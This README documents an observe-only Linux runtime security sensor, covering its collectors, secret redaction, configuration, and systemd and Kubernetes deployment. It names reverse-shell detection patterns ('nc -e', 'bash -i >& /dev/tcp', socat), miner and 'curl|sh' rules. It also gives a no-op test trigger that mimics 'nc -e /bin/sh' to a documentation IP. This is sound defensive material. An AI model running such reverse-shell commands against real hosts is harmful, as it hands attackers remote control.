# CNAPP Runtime Sensor

A lightweight, **observe-only** Linux runtime security sensor for the CNAPP platform. It watches process executions, TCP connections, sensitive-file activity, and which shared libraries and Python packages are actually loaded in memory. It enriches each event with container, Kubernetes, and cloud context, then ships batches to the platform's `POST /api/runtime/events` endpoint.

- Python 3.11+, **standard library only** (optional: distro `python3-bpfcc` for eBPF mode)
- Works on bare VMs (systemd) and Kubernetes nodes (DaemonSet)
- Event contract: [EVENT_SCHEMA.md](EVENT_SCHEMA.md) / [schema/runtime-event.schema.json](schema/runtime-event.schema.json)

## Safety guarantees

The sensor never kills or signals processes, never writes files outside stdout, and never changes network rules or sysctls. Every host path is opened read-only. eBPF programs are tracing-only (tracepoint and kprobes), so they can't block or alter syscalls.

The sensor doesn't collect secrets:
- It never reads file contents. File events carry only the path and operation. Library resolution reads package-manager metadata only: dpkg/apk databases and `dist-info/METADATA` headers.
- Command lines are redacted before they leave the process ([`redact.py`](runtime_sensor/redact.py)):
  - `key=value` values for password, token, secret, api key, access key, auth, credential and session keys
  - the argument after flags like `--password` and `--token`
  - `mysql -pXXX`
  - URL credentials (`https://user:XXX@host`)
  - `Bearer` and `Basic` headers
  - AWS key IDs, GitHub and Slack tokens, JWTs, PEM private-key markers

  Command lines are also truncated to 1024 characters.
- The sensor ignores its own process and its own network traffic, so it can't create feedback loops.

## Architecture

```
            +--------------------------- collectors (pluggable, poll()) --------------------------+
 /proc ---> | ProcessCollector   new (pid,starttime) -> process_exec; euid change -> privilege_change|
 /proc ---> | NetworkCollector   /proc/<pid>/net/tcp{,6} per netns + fd->inode map -> connect/accept|
 inotify -> | FileCollector      /etc/passwd, /etc/shadow, ~/.ssh, k8s SA secrets (stat-poll fallback)|
 /proc ---> | LibraryCollector   /proc/<pid>/maps -> .so / site-packages -> dpkg|apk|dist-info pkg+ver|
 eBPF  ---> | EbpfCollector      sched_process_exec + tcp_v{4,6}_connect (optional, bcc)          |
            +------------------------------------------+-----------------------------------------+
                                                       v
                    Enricher: container_id (cgroup) -> k8s pod/ns (API, cached) -> user -> cloud (DMI)
                                                       v
                    Detections (optional): severity_hint + tags (annotate only)
                                                       v
                    Shipper: bounded queue -> batches -> POST JSON (Bearer token, retry + backoff)
                                                       v
                                 platform backend  POST /api/runtime/events
```

| Module | Purpose |
|---|---|
| `runtime_sensor/procfs.py` | pure /proc parsers (`stat`, `status`, `cmdline`, `cgroup`, `maps`, `net/tcp{,6}`, fd sockets) |
| `runtime_sensor/collectors/` | `base.Collector` interface plus the process, network, file, library and eBPF collectors |
| `runtime_sensor/enrich.py` | container/k8s/cloud/user enrichment |
| `runtime_sensor/detections.py` | local rules: shell spawned by web server, reverse shells (`nc -e`, `bash -i >& /dev/tcp`, socat, python/perl/php), miners (xmrig, stratum), `curl\|sh`, mining-pool ports, sensitive file writes and reads, setuid to root |
| `runtime_sensor/shipper.py` | batching HTTP shipper and dry-run output |
| `runtime_sensor/compat.py` | translation to the backend's current `RuntimeEventIn` model |
| `runtime_sensor/agent.py` | main loop and wiring |

To add a collector, subclass `Collector`, implement `poll() -> list[RuntimeEvent]` (non-blocking), and register it in `agent.build_collectors`.

## Running locally (dry run)

```bash
cd sensor
sudo python3 -m runtime_sensor --dry-run                    # all collectors, JSON lines on stdout
python3 -m runtime_sensor --dry-run --collectors process,network --emit-existing --once
python3 -m runtime_sensor --dry-run --watch /tmp/demo:reads --collectors file
```

Without root you only see your own processes' `exe`, `maps` and fds, and `/etc/shadow` can't be watched. The sensor degrades gracefully.

Try it (harmless triggers): in another terminal run `bash -c 'sleep 5; : nc -e /bin/sh 192.0.2.1 4444'` (a no-op whose command line looks like a reverse shell) or `sudo touch /etc/passwd`, and watch the events show up with `severity_hint` and `tags`.

### Tests

```bash
cd sensor
pip install -r requirements-dev.txt
python -m pytest -q
```

The tests use fixture `/proc` trees (`tests/fixtures/proc`) and a fake root filesystem (`tests/fixtures/rootfs`), so they run on any OS. The inotify test runs only on Linux.

## Configuration

Every flag has an environment variable default. Run `python3 -m runtime_sensor --help` for the full list.

| Env var | Flag | Default |
|---|---|---|
| `SENSOR_API_URL` | `--api-url` | `http://localhost:8000/api/runtime/events` |
| `SENSOR_API_TOKEN` | `--api-token` (prefer the env var) | unset. When set, sent as `Authorization: Bearer ...` |
| `SENSOR_CA_FILE` (or `CNAPP_CA_FILE`) | `--ca-file` | unset. PEM CA certificate(s) of a private/internal CA (e.g. an on-prem server set up with `cnapp-ctl tls init`), trusted in addition to the system store. Verification is never disabled. |
| `SENSOR_ID` | `--sensor-id` | hostname / `NODE_NAME` |
| `SENSOR_COLLECTORS` | `--collectors` | `process,network,file,library` |
| `SENSOR_POLL_INTERVAL` | `--poll-interval` | `2` seconds |
| `SENSOR_LIBRARY_INTERVAL` | `--library-interval` | `60` seconds |
| `SENSOR_INVENTORY_INTERVAL` | `--inventory-interval` | `21600` seconds (6 h) between host package inventories; `0` disables |
| `SENSOR_INVENTORY_URL` | `--inventory-url` | derived from `SENSOR_API_URL` (`.../api/runtime/packages`) |
| `SENSOR_EBPF` | `--ebpf auto\|on\|off` | `auto` (uses eBPF if root and bcc are present) |
| `SENSOR_DRY_RUN` | `--dry-run` | false |
| `SENSOR_DETECTIONS` | `--no-detections` | enabled |
| `SENSOR_PAYLOAD_FORMAT` | `--payload-format cnapp-mvp\|list\|envelope` | `list` |
| `SENSOR_WATCH_PATHS` | `--watch PATH[:reads]` (repeatable) | built-in sensitive path list |
| `SENSOR_PROC_ROOT` / `SENSOR_HOST_ROOT` / `SENSOR_SYS_ROOT` | `--proc-root` / `--host-root` / `--sys-root` | `/proc`, `/`, `/sys` (`/host/...` in the container image) |
| `NODE_NAME` | `--node-name` | unset (set via the downward API on k8s) |
| `SENSOR_K8S_API` | `--no-k8s-api` | enabled when `KUBERNETES_SERVICE_HOST` is set |
| `SENSOR_BATCH_SIZE`, `SENSOR_FLUSH_INTERVAL`, `SENSOR_MAX_QUEUE`, `SENSOR_MAX_RETRIES` | matching flags | `100`, `5`, `10000`, `5` |
| `SENSOR_CLOUD_PROVIDER`, `SENSOR_CLOUD_RESOURCE_ID` | n/a | override DMI cloud detection (e.g. a full Azure ARM ID so events map to inventory assets) |

The default watch list covers `/etc/passwd` (changes only), `/etc/shadow`, `/etc/gshadow`, `/etc/sudoers`, `/etc/sudoers.d`, `/root/.ssh`, `/home/*/.ssh` and `/var/run/secrets/kubernetes.io`. Every entry except `/etc/passwd`, `/etc/sudoers` and `/etc/sudoers.d` also reports reads. Paths ending in `:reads` also report `open()`.

## Running on a VM (systemd)

```bash
sudo install -d /opt/runtime-sensor /etc/runtime-sensor
sudo cp -r sensor/runtime_sensor /opt/runtime-sensor/
sudo install -m 600 sensor/deploy/sensor.env.example /etc/runtime-sensor/sensor.env   # set URL + token
sudo cp sensor/deploy/runtime-sensor.service /etc/systemd/system/
sudo systemctl daemon-reload && sudo systemctl enable --now runtime-sensor
journalctl -u runtime-sensor -f
```

The unit runs as root but with a bounding set of only `CAP_SYS_PTRACE` and `CAP_DAC_READ_SEARCH`, plus `ProtectSystem=strict`, `ReadOnlyPaths=/`, `NoNewPrivileges` and `MemoryMax=256M`. For eBPF mode, `apt install python3-bpfcc` and widen the capabilities as noted in the unit file.

## Running on Kubernetes (DaemonSet)

```bash
docker build -t <registry>/cnapp/runtime-sensor:0.1.0 sensor/
# optional eBPF image: docker build --build-arg WITH_EBPF=true -t <registry>/cnapp/runtime-sensor:0.1.0-ebpf sensor/
docker push <registry>/cnapp/runtime-sensor:0.1.0
kubectl apply -f sensor/deploy/daemonset.yaml        # edit the image + SENSOR_API_URL in the ConfigMap first
kubectl -n cnapp-system create secret generic runtime-sensor --from-literal=api-token=<RUNTIME_INGEST_TOKEN>
kubectl -n cnapp-system logs ds/runtime-sensor -f
```

The manifest uses only the privileges it needs:

| Setting | Why |
|---|---|
| `hostPID: true` | see all node processes |
| host `/proc`, `/sys`, `/etc`, `/root`, `/home` mounted **read-only** | /proc parsing, DMI, passwd, and inotify watches |
| `runAsUser: 0`, capabilities `drop: ALL`, `add: SYS_PTRACE, DAC_READ_SEARCH` | the kernel's access check for other users' `/proc/<pid>/{exe,maps,fd}`; traversing `~/.ssh` |
| `readOnlyRootFilesystem`, `allowPrivilegeEscalation: false`, seccomp `RuntimeDefault` | hardening |
| no `hostNetwork`, not `privileged` | per-netns TCP tables are read through `/proc/<pid>/net` |
| ClusterRole `get,list pods` | map container ID to pod and namespace |
| **eBPF mode only**: `BPF`, `PERFMON`, `SYS_ADMIN` (+ `SYS_RESOURCE` on old kernels), seccomp `Unconfined`, `/sys/kernel/debug`, `/lib/modules`, `/usr/src` | loading kprobes and the tracepoint via bcc |

## Mapping to the platform ingest endpoint

The backend exposes `POST /api/runtime/events`. It accepts native schema v1.0 events (a JSON array, a single event or the `envelope` format) as well as the legacy `cnapp-mvp` shape, up to 1000 events and 1 MiB per request. It requires `Authorization: Bearer $INGEST_API_TOKEN` (fail-closed: 503 if the backend has no token configured).

- Set `SENSOR_API_URL=http://<backend>:8000/api/runtime/events` and `SENSOR_API_TOKEN` to the backend's `INGEST_API_TOKEN`.
- The default `--payload-format list` sends native v1.0 events. The backend maps them onto its detection engine (`network_connect`/`network_accept` -> `network_connection`, `privilege_change` -> `privilege_escalation`, `k8s`/`container_id` -> container context), de-duplicates on `event_id`, and raises CDR-009 for events the sensor marks `high`/`critical` that no backend rule covers.
- `library_loaded` events set the vulnerability "in use at runtime" flag on the matching asset (package name + version, with distro/soname aliases such as `libssl3` -> `openssl`). The flag expires if the hourly heartbeat stops for 3 hours. Only heartbeats that flip a vulnerability are stored as runtime events.
- Every `SENSOR_INVENTORY_INTERVAL` the sensor POSTs the host's package inventory (dpkg with source packages, apk with origins, the sqlite rpmdb of RHEL/Rocky/Alma 9+, and pip-installed packages under `/usr/local/lib/python3*`) to `/api/runtime/packages` with the same token ([schema](EVENT_SCHEMA.md#package-inventory)). The platform matches it with OSV.dev and creates vulnerabilities on the host's asset, which `library_loaded` events then mark "in use". Older platforms answer 404; the sensor logs that once and keeps working. On Kubernetes the DaemonSet mounts `/var/lib/dpkg` and `/var/lib/rpm` read-only for this.
- `--payload-format cnapp-mvp` is still supported for older backends (see [EVENT_SCHEMA.md](EVENT_SCHEMA.md#cnapp-mvp-mapping)); it drops `library_loaded`.
- Asset matching: the backend links an event to an inventory asset by Kubernetes pod name (+ namespace), then `cloud.resource_id` (set `SENSOR_CLOUD_RESOURCE_ID` to the ARM ID), then the VM name matching `host`.
- Error handling: 429 and 5xx responses and network errors are retried with exponential backoff and jitter (up to `SENSOR_MAX_RETRIES`). Other 4xx responses drop the batch and log a warning. When the queue is full, the oldest events are dropped and counted (`stats` are logged at shutdown).

## Limitations

- **Polling misses short-lived processes and connections.** Anything that starts and exits between two polls (default 2s) is missed. eBPF mode fixes this for exec and outbound connect. Accepts and `privilege_change` are still polled.
- **eBPF code is untested in CI.** It needs a Linux kernel and bcc. If eBPF fails, the sensor falls back to polling (`--ebpf auto`). `--ebpf on` fails hard instead.
- **File events don't identify the process.** inotify can't tell which process acted, and reads are detected via `IN_OPEN`. In poll-fallback mode only modifications are visible, not reads.
- **TCP only.** UDP and DNS aren't collected. Loopback is ignored by default (`--include-loopback`).
- **Python packages are only seen through native extensions.** Library detection finds packages that have native extensions (`.so`) in `maps`. Pure-Python packages don't appear in memory maps. For `library_loaded`, RPM databases aren't parsed (falls back to a soname guess); the package inventory does read the sqlite rpmdb (RHEL 9+ family), but not the older BerkeleyDB/ndb formats.
- **Package inventory covers the host only.** Container image contents are not inventoried, and distributions without an OSV ecosystem (Amazon Linux, SUSE, Arch, Container-Optimized OS) are reported but not matched.
- **Pod name and namespace need RBAC.** Resolving them requires the Kubernetes API (`list pods`). Without it, only node and pod UID are reported. `/var/run/secrets/kubernetes.io` on the host is mostly empty: pod SA tokens live under `/var/lib/kubelet/pods/*/volumes`, which isn't mounted by default because it would give the sensor read access to every secret.
- **Per-poll cost.** Every poll reads `stat` and `status` for every PID, and the fd scan runs only when a connection's owner is unknown. That's fine for typical nodes (a few thousand PIDs) but not tuned for very large hosts.
